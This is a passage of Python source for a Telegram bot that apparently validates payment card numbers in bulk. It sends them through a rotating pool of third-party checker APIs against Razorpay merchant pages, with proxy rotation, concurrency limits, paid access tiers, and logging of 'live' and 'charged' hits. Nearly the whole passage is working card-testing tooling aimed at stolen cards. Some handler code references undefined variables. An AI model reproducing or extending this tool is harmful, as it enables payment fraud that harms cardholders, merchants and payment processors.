# ============ RAZORPAY API POOL MANAGER ============

class RazorpayAPIPool:
    """
    Razorpay API Pool - Rotates between multiple Razorpay API endpoints
    Supports weighted round-robin and automatic failover
    Handles multiple response formats (Ravenxkiller, Railway APIs)
    """
    
    def __init__(self, apis=None):
        if apis is None:
            apis = RAZORPAY_API_POOL_CONFIG
        self.apis = apis
        self.api_stats = {}
        self._lock = asyncio.Lock()
        self.session = None
        self._api_index = 0
        
        # Initialize stats for each API
        for api in self.apis:
            self.api_stats[api["name"]] = {
                "total_requests": 0,
                "successful": 0,
                "failed": 0,
                "avg_response_time": 0,
                "last_used": 0,
                "enabled": api.get("enabled", True),
                "weight": api.get("weight", 1)
            }
        
        print(f"🔌 Razorpay API Pool initialized with {len(self.apis)} APIs")
        for api in self.apis:
            status = "✅ ENABLED" if api.get("enabled", True) else "❌ DISABLED"
            print(f"   • {api['name']}: {api['url']} [{status}]")
    
    async def get_session(self):
        """Get or create HTTP session"""
        if self.session is None or self.session.is_closed:
            timeout = httpx.Timeout(45.0, connect=15.0, read=40.0)
            self.session = httpx.AsyncClient(
                timeout=timeout,
                verify=False,
                limits=httpx.Limits(max_keepalive_connections=20, max_connections=50),
                http2=False  # Disable HTTP/2 for better compatibility
            )
        return self.session
    
    async def get_next_api(self) -> dict:
        """Get next API using weighted round-robin - prioritizes enabled APIs"""
        async with self._lock:
            enabled_apis = [api for api in self.apis if api.get("enabled", True)]
            
            if not enabled_apis:
                print("⚠️ All Razorpay APIs disabled! Re-enabling primary API...")
                for api in self.apis:
                    if "tpstech" in api["name"]:
                        api["enabled"] = True
                enabled_apis = [api for api in self.apis if api.get("enabled", True)]
            
            # Weighted selection
            total_weight = sum(api.get("weight", 1) for api in enabled_apis)
            rand = random.uniform(0, total_weight)
            cumulative = 0
            
            for api in enabled_apis:
                cumulative += api.get("weight", 1)
                if rand <= cumulative:
                    selected = api
                    break
            else:
                selected = enabled_apis[0]
            
            # Update last used time
            self.api_stats[selected["name"]]["last_used"] = time.time()
            
            stats = self.api_stats.get(selected["name"], {})
            success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
            print(f"🔄 [Razorpay Pool] Selected: {selected['name']} (weight: {selected.get('weight', 1)}, success: {success_rate:.0f}%)")
            
            return selected.copy()
    
    def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False):
        """Mark API call result for statistics and weighting"""
        for api in self.apis:
            if api["name"] == api_name:
                if success:
                    api["success_count"] = api.get("success_count", 0) + 1
                    api["last_success"] = time.time()
                    api["weight"] = min(20, api.get("weight", 1) + 1)
                else:
                    api["fail_count"] = api.get("fail_count", 0) + 1
                    api["weight"] = max(0.5, api.get("weight", 1) - 0.5)
                
                # Update average response time
                old_avg = api.get("avg_response_time", 0)
                total_calls = api.get("success_count", 0) + api.get("fail_count", 0)
                if total_calls > 0:
                    api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
                
                # Auto-disable if 5 consecutive failures with no successes (only for non-primary APIs)
                if api.get("fail_count", 0) >= 5 and api.get("success_count", 0) == 0:
                    if "tpstech" not in api_name.lower() and "Railway" not in api_name:
                        print(f"⚠️ Disabling Razorpay API {api_name} due to 5 consecutive failures")
                        api["enabled"] = False
                break
        
        # Update stats dict
        if api_name in self.api_stats:
            self.api_stats[api_name]["total_requests"] += 1
            if success:
                self.api_stats[api_name]["successful"] += 1
            else:
                if is_retryable:
                    self.api_stats[api_name]["retryable"] = self.api_stats[api_name].get("retryable", 0) + 1
                else:
                    self.api_stats[api_name]["failed"] += 1
            
            old_avg = self.api_stats[api_name]["avg_response_time"]
            total = self.api_stats[api_name]["total_requests"]
            if total > 0:
                self.api_stats[api_name]["avg_response_time"] = ((old_avg * (total - 1)) + response_time) / total
    
    async def check_card_with_pool(self, card: str, proxy: str = None, user_id: int = None) -> Dict:
        """
        Check a card using the best available API from the pool
        """
        max_attempts = 3
        tried_apis = []
        
        for attempt in range(max_attempts):
            # Get a new API for each attempt
            api = await self.get_next_api()
            api_name = api["name"]
            
            if api_name in tried_apis:
                continue
            tried_apis.append(api_name)
            
            print(f"\n🔍 [Razorpay Pool] Attempt {attempt + 1}/{max_attempts} using: {api_name}")
            
            start_time = time.time()
            
            try:
                result = await self._make_api_request(api, card, proxy, user_id)
                elapsed = time.time() - start_time
                
                if result is None:
                    self.mark_api_result(api_name, False, elapsed, True)
                    continue
                
                status_category = result.get("status_category", "unknown")
                
                # Any valid response (even declined) means API is working
                if status_category in ["charged", "approved", "declined"]:
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    print(f"✅ [Razorpay Pool] {api_name} returned: {status_category} - {result.get('message', '')[:50]}")
                    return result
                else:
                    self.mark_api_result(api_name, False, elapsed, True)
                    continue
                
            except Exception as e:
                elapsed = time.time() - start_time
                self.mark_api_result(api_name, False, elapsed, True)
                print(f"❌ [Razorpay Pool] {api_name} error: {str(e)[:100]}")
                continue
        
        # All attempts failed - return default
        return {
            "status": "error",
            "result": "ALL_APIS_FAILED",
            "message": "All Razorpay APIs failed",
            "status_display": "⚠️ ALL APIS FAILED",
            "status_category": "error",
            "elapsed": 0,
            "price": "₹100",
            "gateway": "Razorpay"
        }
    
    async def _make_api_request(self, api: dict, card: str, proxy: str = None, user_id: int = None) -> Dict:
        """Make request to a specific Razorpay API"""
        
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return None
        
        card_num, month, year, cvv = parts
        
        # Format year (2-digit for most APIs)
        if len(year) == 4:
            year_2digit = year[2:]
        else:
            year_2digit = year
        
        formatted_card = f"{card_num}|{month}|{year_2digit}|{cvv}"
        
        session = await self.get_session()
        
        try:
            url = api["url"]
            api_name = api.get("name", "")
            api_type = api.get("type", "get")
            params_format = api.get("params_format", "query")
            
            # Get parameter names from config
            card_param = api.get("card_param", "card")
            site_param = api.get("site_param", None)
            proxy_param_name = api.get("proxy_param", None)
            response_format = api.get("response_format", "railway")
            
            # ============ FIX: Handle path-based params (NEW RAILWAY API) ============
            if params_format == "path":
                # Format: https://api.com/endpoint/cc=card|mm|yy|cvv
                encoded_card = urllib.parse.quote(formatted_card)
                full_url = f"{url}/{card_param}={encoded_card}"
                
                print(f"📤 [Razorpay] GET {full_url}")
                
                timeout_value = api.get("timeout", 45.0)
                response = await session.get(full_url, timeout=timeout_value)
                
                elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
                print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        print(f"📄 Response: {json.dumps(data, indent=2)[:500]}")
                        return self._parse_response(data, card, elapsed, api_name, response_format)
                    except json.JSONDecodeError as e:
                        print(f"⚠️ JSON parse error: {e}")
                        return None
                else:
                    print(f"⚠️ HTTP {response.status_code}")
                    return None
            
            # ============ Query params format (Ravenxkiller, etc.) ============
            else:
                # Build parameters
                params = {card_param: formatted_card}
                
                # Add site parameter if the API requires it
                if site_param:
                    site = autosopi_site_manager.get_next_site_weighted()
                    if site:
                        if not site.startswith(('http://', 'https://')):
                            site_url = f"https://{site}"
                        else:
                            site_url = site
                        params[site_param] = site_url
                        print(f"📍 Using site: {site_url}")
                    else:
                        # Fallback to default test site
                        params[site_param] = "https://razorpay.me/@tpstech"
                        print(f"📍 Using default site: https://razorpay.me/@tpstech")
                
                # Add proxy if provided
                if proxy and proxy_param_name:
                    proxy_url = format_proxy(proxy)
                    if proxy_url:
                        clean_proxy = proxy_url.replace('http://', '').replace('https://', '')
                        params[proxy_param_name] = clean_proxy
                        print(f"🔧 Using proxy: {clean_proxy[:50]}...")
                
                print(f"📤 [Razorpay] {api_type.upper()} {url}")
                print(f"📤 Params: {params}")
                
                timeout_value = api.get("timeout", 45.0)
                
                if api_type == "post":
                    response = await session.post(url, json=params, timeout=timeout_value)
                else:
                    response = await session.get(url, params=params, timeout=timeout_value)
                
                elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
                print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        print(f"📄 Response: {json.dumps(data, indent=2)[:500]}")
                        return self._parse_response(data, card, elapsed, api_name, response_format)
                    except json.JSONDecodeError as e:
                        print(f"⚠️ JSON parse error: {e}")
                        return None
                else:
                    print(f"⚠️ HTTP {response.status_code}")
                    return None
                
        except httpx.TimeoutException:
            print(f"⏰ Timeout")
            return None
        except httpx.ConnectError as e:
            print(f"❌ Connection error: {e}")
            return None
        except Exception as e:
            print(f"❌ Request error: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def _parse_response(self, data: dict, card: str, elapsed: float, api_name: str = "Unknown", response_format: str = "railway") -> Dict:
        """
        Parse Razorpay API response - handles multiple response formats
        Supports:
        1. NEW Railway API: {"proxy": "...", "response": "...", "status": "..."}
        2. Ravenxkiller API: {"status": "dead/live", "message": "...", "time_taken": "..."}
        3. Railway API: {"status": "...", "status_display": "...", "status_category": "..."}
        """
        
        # ============ CHECK FOR NEW RAILWAY API FORMAT ============
        # Format: {"proxy": "...", "response": "...", "status": "..."}
        if response_format == "railway_new" or ("proxy" in data and "status" in data):
            api_status = data.get("status", "error")
            message = data.get("response", "Unknown")
            proxy_info = data.get("proxy", "Unknown")
            
            print(f"📊 [Razorpay Parse - New Railway] Status: {api_status}, Message: {message[:100]}")
            
            # Parse status
            if api_status == "charged":
                status_category = "charged"
                status_display = "🔥 CHARGED 🔥"
                final_status = "success"
            elif api_status == "approved":
                status_category = "approved"
                status_display = "✅ APPROVED"
                final_status = "success"
            elif api_status == "declined":
                status_category = "declined"
                status_display = "❌ DECLINED"
                final_status = "declined"
            else:
                status_category = "error"
                status_display = "⚠️ ERROR"
                final_status = "error"
            
            return {
                "status": final_status,
                "result": api_status,
                "message": message,
                "status_display": status_display,
                "status_category": status_category,
                "elapsed": elapsed,
                "price": "₹100",
                "gateway": "Razorpay",
                "card": card,
                "api_name": api_name,
                "card_masked": f"{card[:6]}******{card[-4:]}"
            }
        
        # ============ CHECK FOR RAVENXKILLER API FORMAT ============
        # Format: {"card": "...", "status": "dead/live", "message": "...", "site": "...", "time_taken": "..."}
        if response_format == "ravenxkiller" or ("status" in data and data.get("status") in ["dead", "live"]):
            api_status = data.get("status", "error")
            message = data.get("message", "Unknown")
            time_taken = data.get("time_taken", str(elapsed))
            
            print(f"📊 [Razorpay Parse - Ravenxkiller] Status: {api_status}, Message: {message[:100]}")
            
            # Parse status
            if api_status == "dead":
                status_category = "declined"
                status_display = "❌ DECLINED"
                final_status = "declined"
            elif api_status == "live":
                status_category = "approved"
                # Check message for more details
                msg_lower = message.lower()
                if "risk" in msg_lower:
                    status_display = "⚠️ RISK FAILED"
                elif "cvv" in msg_lower or "security" in msg_lower:
                    status_display = "✅ CVV LIVE"
                elif "insufficient" in msg_lower:
                    status_display = "💰 INSUFFICIENT FUNDS"
                else:
                    status_display = "✅ LIVE CARD"
                final_status = "success"
            else:
                status_category = "error"
                status_display = "⚠️ ERROR"
                final_status = "error"
            
            # Try to extract time_taken as float
            try:
                time_float = float(time_taken) if time_taken != "N/A" else elapsed
            except:
                time_float = elapsed
            
            return {
                "status": final_status,
                "result": api_status,
                "message": message,
                "status_display": status_display,
                "status_category": status_category,
                "elapsed": time_float,
                "price": "₹100",
                "gateway": "Razorpay",
                "card": card,
                "api_name": api_name,
                "card_masked": f"{card[:6]}******{card[-4:]}"
            }
        
        # ============ RAILWAY API FORMAT (OLD) ============
        # Format: {"status": "...", "status_display": "...", "status_category": "...", ...}
        status = data.get("status", "error")
        result = data.get("result", "UNKNOWN")
        message = data.get("message", "Unknown")
        status_display = data.get("status_display", "⚠️ UNKNOWN")
        status_category = data.get("status_category", "unknown")
        price = data.get("price", "₹100")
        gateway = data.get("gateway", "Razorpay")
        card_masked = data.get("card_masked", f"{card[:6]}******{card[-4:]}")
        
        print(f"📊 [Razorpay Parse - Railway] Raw status: {status}, Category: {status_category}, Message: {message[:100]}")
        
        # Override based on message content
        msg_lower = message.lower()
        
        if "payment create failed" in msg_lower or "expecting value" in msg_lower:
            status_category = "declined"
            status_display = "❌ DECLINED"
        elif "incorrect card details" in msg_lower or "incorrect_card_details" in msg_lower:
            status_category = "approved"
            status_display = "✅ CVV LIVE"
        elif "insufficient" in msg_lower or "funds" in msg_lower or "balance" in msg_lower:
            status_category = "approved"
            status_display = "💰 INSUFFICIENT FUNDS"
        elif "3d" in msg_lower or "3ds" in msg_lower or "secure" in msg_lower or "authentication" in msg_lower:
            status_category = "approved"
            status_display = "🔐 3D REQUIRED"
        elif "cvv" in msg_lower or "security code" in msg_lower:
            status_category = "approved"
            status_display = "✅ CVV LIVE"
        elif "charged" in msg_lower or "success" in msg_lower or "captured" in msg_lower:
            status_category = "charged"
            status_display = "🔥 CHARGED 🔥"
        elif "expired" in msg_lower:
            status_category = "declined"
            status_display = "❌ EXPIRED CARD"
        elif "declined" in msg_lower and "incorrect" not in msg_lower:
            status_category = "declined"
            status_display = "❌ DECLINED"
        
        return {
            "status": "success" if status_category in ["charged", "approved"] else "declined",
            "result": result,
            "message": message,
            "status_display": status_display,
            "status_category": status_category,
            "elapsed": elapsed,
            "price": price,
            "gateway": gateway,
            "card": card,
            "api_name": api_name,
            "card_masked": card_masked
        }
    
    def get_stats(self) -> str:
        """Get formatted statistics for all APIs"""
        result = "📊 <b>Razorpay API Pool Statistics</b>\n\n"
        
        for api in self.apis:
            name = api["name"]
            stats = self.api_stats.get(name, {})
            enabled = "✅" if api.get("enabled", True) else "❌"
            total = stats.get('total_requests', 0)
            successful = stats.get('successful', 0)
            failed = stats.get('failed', 0)
            success_rate = (successful / max(total, 1)) * 100
            
            result += f"{enabled} <b>{name}</b>\n"
            result += f"   ├─ Requests: {total}\n"
            result += f"   ├─ Success Rate: {success_rate:.1f}%\n"
            result += f"   ├─ Successful: {successful}\n"
            result += f"   ├─ Failed: {failed}\n"
            result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
            result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
        
        return result
    
    def save_stats(self):
        """Save API stats to file"""
        try:
            stats_data = {
                'apis': self.apis,
                'stats': self.api_stats,
                'timestamp': time.time()
            }
            with open('razorpay_api_stats.json', 'w') as f:
                json.dump(stats_data, f, indent=2)
            print(f"💾 Saved Razorpay API stats")
        except Exception as e:
            print(f"⚠️ Error saving API stats: {e}")
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.aclose()
            self.session = None


# Create global instance
razorpay_api_pool = RazorpayAPIPool()



# ============ RAZORPAY GATEWAY FUNCTIONS ============

async def check_razorpay_api(card: str, site: str, amount: int, proxy: str = None) -> Dict:
    """Check card using Razorpay API - FIXED PARSING"""
    
    import urllib.parse
    
    print("\n" + "="*80)
    print("🔍 [RAZORPAY DEBUG] Starting check_razorpay_api")
    print(f"📍 Card: {card}")
    print(f"📍 Site: {site}")
    print(f"📍 Amount: {amount}")
    print(f"📍 Proxy: {proxy if proxy else 'None'}")
    print("="*80)
    
    # Build URL
    api_url = f"{RAZORPAY_API_BASE}/autorz"
    
    params = {
        "url": site,
        "cc": card,
        "amount": str(amount)
    }
    
    if proxy:
        params["proxy"] = proxy
    
    print(f"🌐 Full URL: {api_url}")
    print(f"📤 Params: {params}")
    
    default_result = {
        "success": False,
        "api_response": {},
        "site": site,
        "amount": amount,
        "error": "Unknown error occurred"
    }
    
    try:
        print("📤 Making HTTP request...")
        
        async with httpx.AsyncClient(timeout=90.0, verify=False) as client:
            response = await client.get(api_url, params=params)
        
        print(f"📊 Response status code: {response.status_code}")
        print(f"📊 Response text length: {len(response.text)}")
        
        if response.status_code == 200:
            if not response.text or not response.text.strip():
                print("❌ Empty response body!")
                default_result["error"] = "Empty response from API"
                return default_result
            
            try:
                data = response.json()
                print(f"✅ JSON parsed successfully")
                print(f"📊 Full JSON: {json.dumps(data, indent=2)[:1000]}")
                
                # ============ FIXED: Check 'success' field properly ============
                # The API returns 'success': true even for declined cards
                if data.get("success") == True:
                    print("✅ API returned success=True")
                    
                    # Get status from response
                    status_data = data.get("status", {})
                    status_category = status_data.get("category", "UNKNOWN")
                    status_message = status_data.get("message", "Unknown")
                    
                    # Get other data
                    amount_data = data.get("amount", {})
                    amount_rupees = amount_data.get("rupees", amount)
                    processing_time = data.get("processing_time", 0)
                    order_id = data.get("order_id")
                    
                    # Get BIN info from API
                    bin_info_api = data.get("bin_info", {})
                    bank_name = bin_info_api.get("bank", "N/A")
                    country_name = bin_info_api.get("country", "N/A")
                    scheme = bin_info_api.get("scheme", "N/A")
                    
                    print(f"🎯 Status Category: {status_category}")
                    print(f"📝 Status Message: {status_message}")
                    print(f"💰 Amount: ₹{amount_rupees}")
                    print(f"⏱️ Processing Time: {processing_time}s")
                    
                    default_result["success"] = True
                    default_result["api_response"] = {
                        "status": status_category,
                        "message": status_message,
                        "category": status_category,
                        "bank": bank_name,
                        "scheme": scheme,
                        "country": country_name,
                        "amount": amount_rupees,
                        "processing_time": processing_time,
                        "order_id": order_id
                    }
                    print(f"✅ Returning result: {default_result}")
                    return default_result
                else:
                    # success == False - this is an actual API error
                    error_msg = data.get("error", "Unknown API error")
                    print(f"❌ API returned success=False: {error_msg}")
                    default_result["error"] = error_msg
                    return default_result
                    
            except json.JSONDecodeError as e:
                print(f"❌ JSON decode error: {e}")
                print(f"Raw response: {response.text[:500]}")
                default_result["error"] = f"Invalid JSON: {str(e)[:100]}"
                return default_result
        else:
            print(f"❌ HTTP error: {response.status_code}")
            default_result["error"] = f"HTTP {response.status_code}"
            return default_result
            
    except httpx.TimeoutException as e:
        print(f"⏰ Timeout error: {e}")
        default_result["error"] = "Request timeout"
        return default_result
    except httpx.ConnectError as e:
        print(f"❌ Connection error: {e}")
        default_result["error"] = f"Cannot connect: {str(e)[:100]}"
        return default_result
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        default_result["error"] = str(e)[:100]
        return default_result

def format_razorpay_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Razorpay response for display - FIXED"""
    
    # Safety check
    if result is None:
        return "❌ No response from API", "error"
    
    local_bin_info, local_bank, local_country, _, _ = bin_info
    
    # ============ Check if API call was successful ============
    if not result.get("success"):
        error_msg = result.get('error', 'Unknown error')
        return f"❌ API Error: {error_msg}", "error"
    
    # Get API response data
    api_response = result.get("api_response", {})
    
    # Extract fields
    status_category = api_response.get("category", "UNKNOWN").upper()
    status_message = api_response.get("message", "No message")
    amount = api_response.get("amount", result.get("amount", "N/A"))
    processing_time = api_response.get("processing_time", 0)
    
    # Use API-provided BIN info or fallback to local
    bank_name = api_response.get("bank", local_bank)
    country_name = api_response.get("country", local_country)
    scheme = api_response.get("scheme", local_bin_info)
    
    # Clean the message (remove prefixes)
    clean_message = status_message
    for prefix in ["[LIVE]", "[3DS]", "[DECLINED]", "[EXPIRED]", "[RISK]", "[DEAD]", "[NETWORK]"]:
        if clean_message.startswith(prefix):
            clean_message = clean_message[len(prefix):].strip()
            break
    
    # ============ Determine display based on category ============
    if status_category == "LIVE":
        status_display = "✅ CVV LIVE"
        final_category = "approved"
    elif status_category == "3DS":
        status_display = "🔐 3DS REQUIRED"
        final_category = "approved"
    elif status_category == "DECLINED":
        status_display = "❌ DECLINED"
        final_category = "declined"
    elif status_category == "EXPIRED":
        status_display = "⚠️ EXPIRED"
        final_category = "declined"
    elif status_category == "RISK":
        status_display = "⚠️ RISK FAILED"
        final_category = "declined"
    elif status_category == "DEAD":
        status_display = "💀 DEAD CARD"
        final_category = "declined"
    elif status_category == "NETWORK":
        status_display = "⚠️ NETWORK ERROR"
        final_category = "error"
    else:
        # Check message for keywords as fallback
        message_upper = status_message.upper()
        if "LIVE" in message_upper or "CVV" in message_upper:
            status_display = "✅ CVV LIVE"
            final_category = "approved"
        elif "INSUFFICIENT" in message_upper:
            status_display = "💰 INSUFFICIENT FUNDS"
            final_category = "approved"
        elif "3DS" in message_upper:
            status_display = "🔐 3DS REQUIRED"
            final_category = "approved"
        elif "DECLINED" in message_upper:
            status_display = "❌ DECLINED"
            final_category = "declined"
        elif "DEAD" in message_upper or "INVALID" in message_upper:
            status_display = "💀 DEAD CARD"
            final_category = "declined"
        else:
            status_display = "⚠️ UNKNOWN"
            final_category = "unknown"
    
    # Format amount
    try:
        amount_float = float(amount) if isinstance(amount, (int, float, str)) else 10
        amount_display = f"₹{amount_float:.2f}" if amount_float < 1000 else f"₹{amount_float:.0f}"
    except:
        amount_display = f"₹{amount}"
    
    # Format the response
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Razorpay\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ 3₹\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {scheme}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_name}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {processing_time:.2f}s"
    )
    
    return ui, final_category
@check_gateway("razorpay")
async def single_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Razorpay using API pool - /rz <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Razorpay Single Check (API Pool)</b>\n\n"
            "Usage: <code>/rz &lt;card&gt;</code>\n"
            "Example: <code>/rz 4111111111111111|12|2028|123</code>\n\n"
            "💰 Amount: ₹100\n"
            "📍 Gateway: Razorpay (Multiple APIs)\n"
            "⚡ Features:\n"
            "   • API pool rotation\n"
            "   • Automatic failover\n"
            "   • Proxy support",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2028|123"
        )
        return
    
    # Check credits
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'razorpay'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    razorpay_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text(f"🔄 Checking...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
                if proxy_list:
                    proxy_str = proxy_list[0]
        
        # Use the pool to check the card - FIXED: Call the correct function
        result = await check_card_razorpay_with_pool(card, proxy_str, user_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        # Format response - use the razorpay2 formatter since it works
        ui, status_category = format_razorpay2_response(result, card, bin_info)
        
        # Send result
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved or charged
        if status_category in ["charged", "approved"]:
            await save_hit_to_file(
                card=card, gateway="Razorpay",
                response=result.get("message", "Approved"),
                price="₹1",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            if status_category == "charged":
                user_data = user_manager.get_user(user_id)
                await send_hit_notification(
                    context=context, gateway="Razorpay", card=card,
                    response=result.get("message", "Charged"),
                    price="₹1",
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        # Show remaining credits for free users
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        print(f"❌ Razorpay error: {e}")
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        add_user_credits(user_id, 1)
    finally:
        razorpay_active_tasks.pop(user_id, None)
        
# ============ RAZORPAY CHECK FUNCTION USING POOL ============
@check_gateway("razorpay")
async def razorpay_mass_check_with_pool(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """
    Mass check for Razorpay using API pool with PROXY SUPPORT
    - 2 retries for HTTP 500 errors
    - Errors always show as 0 in final summary
    """
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [RAZORPAY MASS CHECK WITH POOL] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    
    # ============ GET USER'S WORKING PROXIES ============
    user_proxies = []
    if user_manager.can_use_proxy(u_id):
        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
            print(f"🔌 Found {len(user_proxies)} working proxies for user {u_id}")
        else:
            if u_id in proxy_manager.user_proxies and proxy_manager.user_proxies[u_id]:
                user_proxies = proxy_manager.user_proxies[u_id]
                print(f"📦 Using {len(user_proxies)} raw proxies (not tested)")
            else:
                print(f"⚠️ No proxies found for user {u_id}, using direct connection")
    else:
        print(f"⚠️ User {u_id} cannot use proxies (tier restriction)")
    
    stats = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "errors": 0,  # Will always be 0 in final summary
        "total": total,
        "processed": 0,
        "api_usage": {},
        "retries_used": 0
    }
    
    start_time = time.time()
    
    try:
        razorpay_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        CONCURRENCY = {
            "free": 1,
            "premium": 2,
            "ultimate": 10,
            "admin": 10,
        }.get(tier, 2)
        
        # ============ ONLY CREATE PROGRESS MESSAGE IF NONE PROVIDED ============
        if progress_msg is None:
            charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            
            progress_text = (
                f"<b>Gateway</b> ➛ Razorpay\n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
            print(f"📊 Created new progress message for user {u_id}")
        else:
            print(f"📊 Using existing progress message for user {u_id}")
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed_count = 0
        proxy_index = 0
        
        async def update_progress(current: int):
            """Update the existing progress message - don't create new one"""
            if current > 0 and current < total and current % 10 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            if current >= total:
                status_text = "FINISHED ✅"
            else:
                status_text = f"PROCESSING {current}/{total}"
            
            charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            
            progress_text = (
                f"<b>Gateway</b> ➛ Razorpay\n"
                f"<b>Status</b> ➛ {status_text}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"  # Always 0
                f"<b>Time</b> ➛ {time_str}"
            )
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                print(f"⚠️ Progress update error: {e}")
        
        async def process_single_card_with_retry(card: str, idx: int):
            """Process a single card with 2 retries for HTTP 500"""
            nonlocal processed_count, proxy_index
            
            await asyncio.sleep(random.uniform(0.1, 0.3))
